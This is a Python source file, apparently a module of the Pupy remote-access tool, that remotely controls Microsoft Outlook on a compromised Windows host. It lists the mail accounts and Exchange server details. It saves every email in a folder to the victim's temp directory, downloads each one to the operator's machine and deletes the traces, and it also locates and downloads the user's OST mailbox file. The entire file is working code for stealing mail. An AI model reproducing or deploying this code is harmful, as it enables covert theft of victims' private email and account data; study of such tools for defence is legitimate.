# -*- coding: UTF8 -*-

import os, logging, sys, time
from rpyc.utils.classic import download
from pupylib.utils.term import colorize
from collections import OrderedDict

class outlook():
	'''
	'''
	
	OL_SAVE_AS_TYPE={'olTXT': 0,'olRTF':1,'olTemplate': 2,'olMSG': 3,'olDoc':4,'olHTML':5,'olVCard': 6,'olVCal':7,'olICal': 8}
	OL_DEFAULT_FOLDERS = {'olFolderDeletedItems':3,'olFolderDrafts':16,'olFolderInbox':6,'olFolderJunk':23,'olFolderSentMail':5}
	OL_ACCOUNT_TYPES = {4:'olEas',0:'olExchange',3:'olHttp',1:'olImap',5:'olOtherAccount',2:'olPop3'}
	OL_EXCHANGE_CONNECTION_MODE = {100:'olOffline',500:'olOnline',200:'olDisconnected',300:'olConnectedHeaders',400:'olConnected',0:'olNoExchange'}
	
	def __init__(self, module, rootPupyPath, localFolder="output/", folderIndex=None, folderId=None, sleepTime=3, msgSaveType='olMSG', autoConnectToMAPI=True):
		'''
		'''
		self.module = module
		self.outlook = None
		self.mapi = None
		self.localFolder = os.path.join(localFolder, "{0}-{1}-{2}".format(self.module.client.desc['hostname'].encode('utf-8'), self.module.client.desc['user'].encode('utf-8'), self.module.client.desc['macaddr'].encode('utf-8').replace(':','')))
		self.foldersAndSubFolders = None
		self.folderId = folderId
		self.folderIndex = folderIndex
		self.msgSaveType = msgSaveType
		self.inbox = None
		self.constants = None
		self.sleepTime = sleepTime
		self.remoteTempFolder = self.module.client.conn.modules['os.path'].expandvars("%TEMP%")
		if autoConnectToMAPI == True : self.__connect__()
		if not os.path.exists(self.localFolder):
			logging.debug("Creating the {0} folder locally".format(self.localFolder))
			os.makedirs(self.localFolder)
				
	def __connect__(self):
		'''
		Returns True if no error
		Otherise returns False
		'''
		
		self.outlook = self.module.client.conn.modules['win32com.client'].Dispatch("Outlook.Application")
		#self.outlook = self.module.client.conn.modules['win32com.client.gencache'].EnsureDispatch("Outlook.Application")
		self.mapi = self.outlook.GetNamespace("MAPI")
		if self.folderId == None : self.setDefaultFolder(folderIndex=self.folderIndex)
		else : self.setFolderFromId(folderId=self.folderId)
		return True
	
	def close(self):
		'''
		'''
		logging.debug("Closing Outlook link...")
		self.outlook.Quit()
		
	def getInformation(self):
		'''
		Returns Dictionnary
		'''
		info = OrderedDict()
		info['CurrentProfileName']=self.mapi.CurrentProfileName
		#info['CurrentUserAddress']=repr(self.mapi.CurrentUser) #Needs to be authenticiated to remote mail server. Otherwise, infinite timeout
		info['SessionType']=self.outlook.Session.Type
		for i, anAccount in enumerate(self.outlook.Session.Accounts):
			info['Account{0}-DisplayName'.format(i)]=anAccount.DisplayName
			info['Account{0}-SmtpAddress'.format(i)]=anAccount.SmtpAddress
			info['Account{0}-AutoDiscoverXml'.format(i)]=anAccount.AutoDiscoverXml
			info['Account{0}-AccountType'.format(i)]=self.OL_ACCOUNT_TYPES[anAccount.AccountType]
			#info['Account{0}-UserName'.format(i)]=anAccount.UserName #Needs to be authenticiated to remote mail server. Otherwise, infinite timeout
		info['ExchangeMailboxServerName']=self.mapi.ExchangeMailboxServerName #Returns a String value that represents the name of the Exchange server that hosts the primary Exchange account mailbox.
		info['ExchangeMailboxServerVersion']=self.mapi.ExchangeMailboxServerVersion #Returns a String value that represents the full version number of the Exchange server that hosts the primary Exchange account mailbox.
		info['Offline']=self.mapi.Offline #Returns a Boolean indicating True if Outlook is offline (not connected to an Exchange server), and False if online (connected to an Exchange server)
		info['ExchangeConnectionMode']=self.OL_EXCHANGE_CONNECTION_MODE[self.mapi.ExchangeConnectionMode]
		self.mapi.SendAndReceive(True)
		print repr(self.mapi)
		return info
		
		
	def __getOlDefaultFoldersNameFromIndex__(self, folderIndex):
		'''
		Return None if folderIndex not found in OlDefaultFolders
		Otherwise returns Name of the folder
		'''
		found = False
		for k in self.OL_DEFAULT_FOLDERS:
			if self.OL_DEFAULT_FOLDERS[k] == folderIndex:
				return k
		return ""
	
	def setDefaultFolder(self, folderIndex=None):
		'''
		See https://msdn.microsoft.com/fr-fr/library/office/ff861868.aspx for folderIndex
		Return True if done
		Otherwise returns False
		'''
		if folderIndex == None: 
			folderIndex = self.OL_DEFAULT_FOLDERS['olFolderInbox']
		folderName = self.__getOlDefaultFoldersNameFromIndex__(folderIndex)
		if folderName == None:
			logging.warning('Impossible to move the default folder to {0}. This folder index is not in {1}'.format(folderIndex, self.OL_DEFAULT_FOLDERS))
			return False
		else:
			logging.debug("Moving outlook default folder to {0}".format(folderName))
			self.inbox = self.mapi.GetDefaultFolder(folderIndex)
			return True
	
	def setFolderFromId(self, folderId):
		'''
		See https://msdn.microsoft.com/fr-fr/library/office/ff861868.aspx for folderIndex
		Return True if done
		Otherwise returns False
		'''
		if folderId == None: 
			logging.error("Impossible to set Outlook folder to None")
			return False
		else:
			logging.debug("Moving outlook default folder to {0}".format(folderId))
			self.inbox = self.mapi.GetFolderFromID(folderId)
			return True
	
	"""
	def getAnEmail(self, nb):
		'''
		nb: number of the email
		nb>=1
		'''
		return self.inbox.Items[nb]
	"""
	
	"""
	def getEmailsWithSubject(self, subject):
		'''
		Returns a list which contains all emails (mailItem objects) when subject is in the email subject
		'''
		emails = []
		for anEmail in self.inbox.Items:
			if subject in anEmail.Subject:
				emails.append(anEmail)
		return emails
	"""
		
	def getEmails(self):
		'''
		Returns a list which contains all mailitems
		'''
		emails = []
		logging.debug("Getting {0} emails...".format(self.getNbOfEmails()))
		for anEmail in self.inbox.Items:
			emails.append(anEmail)
		return emails
		
	def downloadAnEmail(self, mailItem):
		'''
		'''
		ctime, subjectCleaned, receivedTime, path, filename = str(time.time()).replace('.',''), "Unknown", "Unknown", "", ""
		try:
			subjectCleaned = ''.join(l for l in mailItem.Subject.encode('ascii','ignore') if l.isalnum())
			receivedTime = str(mailItem.ReceivedTime).replace('/','').replace('\\','').replace(':','-').replace(' ','_')
		except Exception,e:
			logging.warning("Impossible to encode email subject or receivedTime:{0}".format(repr(e)))
		filename = "{0}_{1}_{2}.{3}".format(receivedTime, ctime, subjectCleaned[:100], 'msg')
		path = self.module.client.conn.modules['os.path'].join(self.remoteTempFolder,filename)
		logging.debug('Saving temporarily the email on the remote path {0}'.format(path))
		#mailItem.SaveAs(path, self.OL_SAVE_AS_TYPE['olMSG'])
		mailItem.SaveAs(path, outlook.OL_SAVE_AS_TYPE[self.msgSaveType])
		try:
			self.module.client.conn.modules['os'].rename(path, path) #test if the file is not opened by another process
		except OSError as e:
			time.sleep(self.sleepTime)
		logging.debug("Downloading the file {0} to {1}".format(path, self.localFolder))
		download(self.module.client.conn, path, os.path.join(self.localFolder, filename))
		logging.debug("Deleting {0}".format(path))
		self.module.client.conn.modules.os.remove(path)
	
	def downloadAllEmails(self):
		'''
		'''
		logging.debug("Downloading all emails")
		for i, anEmail in enumerate(self.getEmails()):
			self.downloadAnEmail(anEmail)
			sys.stdout.write('\r{2}Downloading email {0}/{1}...'.format(i+1 ,self.getNbOfEmails(), colorize("[+] ","green")))
			sys.stdout.flush()
		print "\n"
	
	"""
	def getAllSubjects(self):
		'''
		'''
		subjects = []
		logging.debug("Getting subjects of {0} emails...".format(self.getNbOfEmails()))
		for anEmail in self.inbox.Items:
			subjects.append(anEmail.Subject)
		return subjects
	"""
	
	def getNbOfEmails(self):
		'''
		'''
		#nc = self.inbox.Count
		nb = len(self.inbox.Items)
		logging.debug("Getting number of emails... {0} emails".format(nb))
		return nb
		
	def __getAllFolders__(self):
		'''
		'''
		folders = {}
		for inx, folder in enumerate(list(self.mapi.Folders)):
			logging.debug("New folder: {0}({1})".format(folder.Name, folder.EntryID))
			folders[folder.Name] = {}
			if "Dossiers publics" not in folder.Name and "Public folders" not in folder.Name: #Bug in my version of outlook when getting emails in public folder
				for inx,subfolder in enumerate(list(folder.Folders)):
					logging.debug("{0}->{1} ({2})".format(inx, subfolder.Name.encode('utf-8'), subfolder.EntryID))
					folders[folder.Name][subfolder.Name]=subfolder.EntryID
		return folders
	
	def printFoldersAndSubFolders(self):
		'''
		'''
		foldersAndSubFolders = self.__getAllFolders__()
		for i,folder in enumerate(foldersAndSubFolders):
			print "{0}: {1}".format(i, folder.encode('utf-8'))
			for j,subFolder in enumerate(foldersAndSubFolders[folder]):
				print "  {0}.{1}: {2} (id: {3})".format(i, j, subFolder.encode('utf-8'), foldersAndSubFolders[folder][subFolder].encode('utf-8'))
	
	
	def getPathToOSTFiles(self):
		'''
		According to https://support.office.com/en-us/article/Locating-the-Outlook-data-files-0996ece3-57c6-49bc-977b-0d1892e2aacc
		'''
		paths = []
		DEFAULT_LOCATIONS_OST = ["<drive>:\Users\<username>\AppData\Local\Microsoft\Outlook",
		"<drive>:\Documents and Settings\<username>\Local Settings\Application Data\Microsoft\Outlook"
		]
		systemDrive = self.module.client.conn.modules['os'].getenv("SystemDrive")
		login = self.module.client.conn.modules['os'].getenv("username")
		for aLocationOST in DEFAULT_LOCATIONS_OST :
			completeLocationOST = aLocationOST.replace("<drive>",systemDrive[:-1]).replace("<username>",login)
			regex = self.module.client.conn.modules['os.path'].join(completeLocationOST,"*.ost")
			logging.debug('Searching OST file in {0}'.format(regex))
			files = self.module.client.conn.modules['glob'].glob(regex)
			for aFile in files:
				ostFileFound = self.module.client.conn.modules['os.path'].join(completeLocationOST,aFile)
				logging.info('OST file found in {0}'.format(ostFileFound))
				paths.append(ostFileFound)
		return paths
		
	def downloadOSTFile(self):
		'''
		Return file downloaded or None
		'''
		paths = self.getPathToOSTFiles()
		if len(paths)>0:
			filename = self.module.client.conn.modules['os.path'].basename(paths[0])
			logging.debug("Downloading the file {0} to {1}".format(paths[0], self.localFolder))
			download(self.module.client.conn, paths[0], os.path.join(self.localFolder, filename))
			return paths[0]
		else:
			return None
		
	
	"""
	def __getRecipientsAddresses__(self, RecipientsObject):
		'''
		'''
		recipients = []
		for aRecipient in RecipientsObject:
			recipients.append(aRecipient.Address)
		return recipients
		
	def __getSenderAddress__(self, mailItem):
		'''
		'''
		if mailItem.SenderEmailType=='EX':
			try:
				return mailItem.Sender.GetExchangeUser().PrimarySmtpAddress
			except Exception,e:
				logging.warning("Impossible to get sender email address: {0}".format(e))
		return mailItem.SenderEmailAddress
		
	def printMailItem(self, mailItem):
		'''
		'''
		print "ReceivedTime: {0}".format(mailItem.ReceivedTime)
		#print "Sender: {0}".format(self.__getSenderAddress__(mailItem))
		#print "Recipients: {0}".format(self.__getRecipientsAddresses__(mailItem.Recipients))
		print "Subject: {0}".format(repr(mailItem.Subject))
		print "Body: {0}".format(repr(mailItem.Body))
	"""
